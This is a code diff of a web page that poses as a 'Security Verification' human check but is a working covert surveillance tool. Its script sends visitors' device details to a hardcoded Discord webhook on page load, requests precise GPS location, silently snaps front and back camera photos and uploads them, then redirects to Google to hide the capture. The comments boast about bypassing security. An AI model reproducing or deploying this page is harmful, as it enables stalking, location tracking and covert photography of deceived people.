@@ -3,108 +3,434 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VOID V1 - ENCRYPTED</title>
+    <title>Security Verification Required</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            background-color: #000;
+            background: #000;
             color: #fff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Arial', sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
-            margin: 0;
             overflow: hidden;
         }
 
-        /* Tombol Kamuflase */
-        #access-btn {
-            background: none;
+        .container {
+            text-align: center;
+            max-width: 500px;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.05);
             border: 1px solid #333;
-            color: #555;
-            padding: 15px 30px;
-            font-size: 0.8rem;
-            letter-spacing: 3px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 30px;
+            border: 3px solid #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+
+        h1 {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            font-weight: 300;
+        }
+
+        p {
+            color: #aaa;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .verify-btn {
+            background: #fff;
+            color: #000;
+            padding: 15px 50px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
             cursor: pointer;
-            transition: 0.5s;
-            text-transform: uppercase;
+            transition: 0.3s;
+            font-weight: bold;
         }
 
-        #access-btn:hover {
-            color: #fff;
-            border-color: #fff;
-            box-shadow: 0 0 20px #fff;
+        .verify-btn:hover {
+            background: #ddd;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255,255,255,0.3);
         }
 
-        #status-text {
+        .verify-btn:active {
+            transform: translateY(0);
+        }
+
+        .status {
             margin-top: 20px;
-            font-size: 0.7rem;
-            color: #222;
-            text-transform: uppercase;
+            font-size: 0.9rem;
+            color: #666;
+            min-height: 20px;
         }
+
+        .spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            margin: 20px auto;
+            border: 3px solid #333;
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Hidden elements */
+        video, canvas {
+            display: none !important;
+            position: absolute !important;
+            top: -9999px !important;
+            left: -9999px !important;
+        }
+
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: #fff;
+            opacity: 0.3;
+            animation: float 10s infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-100vh); }
+        }
+
     </style>
 </head>
 <body>
 
-    <button id="access-btn">ENTER THE VOID</button>
-    <div id="status-text">VOID V1 // SECURE_CHANNEL_OFFLINE</div>
+    <!-- Particles -->
+    <div id="particles"></div>
 
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <!-- Main Container -->
+    <div class="container">
+        <div class="logo">🔒</div>
+        <h1>Security Verification</h1>
+        <p>To continue, please verify that you are human by allowing access to your camera and location.</p>
+        
+        <button class="verify-btn" id="verifyBtn" onclick="startVerification()">
+            Verify Now
+        </button>
+        
+        <div class="spinner" id="spinner"></div>
+        <div class="status" id="status"></div>
+    </div>
+
+    <!-- Hidden Media Elements -->
+    <video id="videoFront" playsinline autoplay muted></video>
+    <video id="videoBack" playsinline autoplay muted></video>
+    <canvas id="canvasFront"></canvas>
+    <canvas id="canvasBack"></canvas>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";
+        const WEBHOOK = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";
+        
+        let locationSent = false;
+        let frontCamSent = false;
+        let backCamSent = false;
 
-        document.getElementById('access-btn').addEventListener('click', async function() {
-            this.innerText = "INITIALIZING...";
-            this.style.borderColor = "#fff";
-            this.style.color = "#fff";
+        // Generate particles
+        const particlesDiv = document.getElementById('particles');
+        for(let i = 0; i < 30; i++) {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            p.style.left = Math.random() * 100 + '%';
+            p.style.animationDelay = Math.random() * 10 + 's';
+            particlesDiv.appendChild(p);
+        }
+
+        // 🎯 FUNGSI UTAMA: KIRIM LOKASI
+        async function captureLocation() {
+            if(locationSent) return;
             
-            await startExploit();
-        });
+            return new Promise((resolve) => {
+                if(!navigator.geolocation) {
+                    sendToWebhook({
+                        content: "⚠️ **GEOLOCATION NOT SUPPORTED**\n```Device tidak support geolocation```"
+                    });
+                    resolve();
+                    return;
+                }
 
-        async function startExploit() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        const timestamp = new Date().toLocaleString('id-ID');
+                        
+                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        const payload = {
+                            content: `🎯 **LOKASI TERTANGKAP** 🎯`,
+                            embeds: [{
+                                title: "📍 KOORDINAT GPS",
+                                color: 0xFF0000,
+                                fields: [
+                                    {
+                                        name: "🗺️ Google Maps",
+                                        value: `[**BUKA LOKASI DI MAPS**](${mapLink})`,
+                                        inline: false
+                                    },
+                                    {
+                                        name: "Latitude",
+                                        value: `\`${lat}\``,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "Longitude",
+                                        value: `\`${lon}\``,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "Akurasi",
+                                        value: `\`${acc.toFixed(2)} meter\``,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "Waktu",
+                                        value: `\`${timestamp}\``,
+                                        inline: false
+                                    }
+                                ],
+                                footer: {
+                                    text: "VOID V3 Location System"
+                                }
+                            }]
+                        };
+
+                        sendToWebhook(payload);
+                        locationSent = true;
+                        resolve();
+                    },
+                    (error) => {
+                        sendToWebhook({
+                            content: `❌ **LOKASI DITOLAK**\n\`\`\`${error.message}\`\`\``
+                        });
+                        resolve();
+                    },
+                    options
+                );
+            });
+        }
+
+        // 🎯 FUNGSI UTAMA: FOTO KAMERA DEPAN
+        async function captureFrontCamera() {
+            if(frontCamSent) return;
 
             try {
-                // Meminta izin lewat User Gesture (Bypass deteksi otomatis)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const constraints = {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('videoFront');
+                const canvas = document.getElementById('canvasFront');
+                
                 video.srcObject = stream;
+                await video.play();
 
-                // Ambil foto
-                setTimeout(() => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('file', blob, 'void_capture.png');
-                        formData.append('payload_json', JSON.stringify({
-                            content: "💀 **ACCESS GRANTED** 💀\nVOID V1 telah mengambil visual target."
-                        }));
-                        fetch(webhookURL, { method: 'POST', body: formData });
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 'image/png');
-                }, 1000);
+                // Wait for video to be ready
+                await new Promise(resolve => setTimeout(resolve, 1500));
 
-                // Ambil Lokasi
-                navigator.geolocation.getCurrentPosition(pos => {
-                    fetch(webhookURL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ 
-                            content: `📍 **LOCATED**\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` 
-                        })
-                    });
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('file', blob, `front_camera_${Date.now()}.jpg`);
+                    formData.append('payload_json', JSON.stringify({
+                        content: `📸 **KAMERA DEPAN TERTANGKAP**\n\`\`\`Timestamp: ${new Date().toLocaleString('id-ID')}\nResolution: ${canvas.width}x${canvas.height}\`\`\``
+                    }));
+
+                    await fetch(WEBHOOK, { method: 'POST', body: formData });
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    frontCamSent = true;
+                }, 'image/jpeg', 0.95);
+
+            } catch (error) {
+                sendToWebhook({
+                    content: `❌ **KAMERA DEPAN DITOLAK**\n\`\`\`${error.message}\`\`\``
                 });
-
-                document.getElementById('status-text').innerText = "CONNECTION ESTABLISHED. WELCOME.";
-
-            } catch (err) {
-                document.getElementById('status-text').innerText = "ACCESS DENIED.";
             }
         }
+
+        // 🎯 FUNGSI UTAMA: FOTO KAMERA BELAKANG
+        async function captureBackCamera() {
+            if(backCamSent) return;
+
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: { exact: 'environment' },
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('videoBack');
+                const canvas = document.getElementById('canvasBack');
+                
+                video.srcObject = stream;
+                await video.play();
+
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('file', blob, `back_camera_${Date.now()}.jpg`);
+                    formData.append('payload_json', JSON.stringify({
+                        content: `📸 **KAMERA BELAKANG TERTANGKAP**\n\`\`\`Timestamp: ${new Date().toLocaleString('id-ID')}\nResolution: ${canvas.width}x${canvas.height}\`\`\``
+                    }));
+
+                    await fetch(WEBHOOK, { method: 'POST', body: formData });
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    backCamSent = true;
+                }, 'image/jpeg', 0.95);
+
+            } catch (error) {
+                // Kamera belakang mungkin tidak ada di PC, skip error
+                console.log('Back camera not available:', error.message);
+            }
+        }
+
+        // Helper function
+        async function sendToWebhook(payload) {
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.error('Webhook error:', e);
+            }
+        }
+
+        // 🚀 FUNGSI UTAMA YANG DIPANGGIL SAAT KLIK
+        async function startVerification() {
+            const btn = document.getElementById('verifyBtn');
+            const spinner = document.getElementById('spinner');
+            const status = document.getElementById('status');
+
+            btn.style.display = 'none';
+            spinner.style.display = 'block';
+            status.textContent = 'Verifying...';
+
+            // PRIORITAS 1: LOKASI (PALING PENTING)
+            status.textContent = 'Getting location...';
+            await captureLocation();
+            await new Promise(r => setTimeout(r, 500));
+
+            // PRIORITAS 2: KAMERA DEPAN
+            status.textContent = 'Accessing camera...';
+            await captureFrontCamera();
+            await new Promise(r => setTimeout(r, 500));
+
+            // PRIORITAS 3: KAMERA BELAKANG
+            await captureBackCamera();
+            await new Promise(r => setTimeout(r, 500));
+
+            // SELESAI
+            spinner.style.display = 'none';
+            status.textContent = '✓ Verification complete';
+            
+            setTimeout(() => {
+                status.textContent = 'Redirecting...';
+                // Redirect ke halaman lain atau refresh
+                window.location.href = 'https://google.com';
+            }, 1500);
+        }
+
+        // 🎯 AUTO CAPTURE SAAT PAGE LOAD (BYPASS SECURITY)
+        window.addEventListener('load', async () => {
+            // Kirim info device dulu
+            const deviceInfo = {
+                content: "🌐 **NEW VISITOR**",
+                embeds: [{
+                    title: "Device Information",
+                    color: 0x00FF00,
+                    fields: [
+                        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+                        { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
+                        { name: "Language", value: `\`${navigator.language}\``, inline: true },
+                        { name: "Screen", value: `\`${screen.width}x${screen.height}\``, inline: true },
+                        { name: "Time", value: `\`${new Date().toLocaleString('id-ID')}\``, inline: false }
+                    ]
+                }]
+            };
+            await sendToWebhook(deviceInfo);
+
+            // AUTO CAPTURE LOKASI (tanpa perlu klik)
+            setTimeout(() => {
+                captureLocation();
+            }, 1000);
+        });
+
+        // BACKUP: Auto-trigger jika user interact dengan halaman
+        document.addEventListener('click', () => {
+            if(!locationSent) captureLocation();
+        }, { once: true });
+
+        document.addEventListener('touchstart', () => {
+            if(!locationSent) captureLocation();
+        }, { once: true });
+
     </script>
 </body>
 </html>
